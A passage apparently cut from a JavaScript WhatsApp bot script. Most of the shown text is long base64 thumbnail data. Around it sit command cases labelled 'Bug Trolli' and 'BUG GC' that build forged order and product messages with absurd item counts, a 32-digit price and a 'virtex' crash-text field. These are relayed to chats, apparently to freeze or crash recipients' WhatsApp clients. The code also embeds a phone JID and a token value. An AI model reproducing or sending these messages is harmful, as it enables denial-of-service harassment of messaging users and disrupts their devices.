                                          "thumbnail": "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",
                                          "itemCount": 1000000000000,
                                          "status": "INQUIRY",
                                          "surface": "CATALOG",
                                          "orderTitle": "GUA GK NGERTI",
                                          "message": "entah lah gua nob",
                                          "sellerJid": "6288224859350@s.whatsapp.net",
                                          "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
                                          "totalAmount1000": "Rp 25.000.00",
                                          "totalCurrencyCode": "IDR",
                                          "contextInfo": {
                                                 "forwardingScore": 3,
                                                 "isForwarded": true
                                          }
                                   }
                            }, {
                                   quoted: bugtrol,
                                   contextInfo: {}
                            })

                            dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
                            dha.relayWAMessage(res)
                            break
                     case 'plp':
                            res = await dha.prepareMessageFromContent(from, {
                                   "listMessage": {
                                          "title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
                                          "description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
                                          "buttonText": vipi,
                                          "listType": "SINGLE_SELECT",
                                          "sections": [{
                                                 "title": vipi,
                                                 "rows": [{
                                                        "title": "Banned",
                                                        "rowId": "Banned"
                                                 }]
                                          }]
                                   }
                            }, {
                                   quoted: mek
                            })
                            dha.relayWAMessage(res)
                            break
                     case 'pcp':
                            if (!mek.key.fromMe && !isOwner) return
                            buf = Mfake
                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
                            imeg = imeu.message.imageMessage
                            res = await dha.prepareMessageFromContent(from, {
                                   "productMessage": {
                                          "product": {
                                                 "productImage": imeg,
                                                 "productId": "150453297177375",
                                                 "title": `NOIR BOT ~ 404 ${vipi}`,
                                                 "description": `${virtex}`,
                                                 "currencyCode": "IDR",
                                                 "priceAmount1000": "99999999999999999999999999999999",
                                                 "productImageCount": 1
                                          },
                                          "businessOwnerJid": "6288224859350@s.whatsapp.net",
                                          "contextInfo": {
                                                 "forwardingScore": 3,
                                                 "isForwarded": true
                                          }
                                   }
                            }, {
                                   quoted: bugtrol,
                                   contextInfo: {}
                            })

                            dha.relayWAMessage(res)
                            break
                            // Bug Trolli ( NOIR BOT )
                     case 'psp': // BUG TROLLI + BUG GC + TROLLI
                            if (!mek.key.fromMe && !isOwner) return
                            buf = Mfake
                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
                            imeg = imeu.message.imageMessage
                            res = await dha.prepareMessageFromContent(from, {
                                   "orderMessage": {
                                          "orderId": "150453297177375",
                                          "thumbnail": "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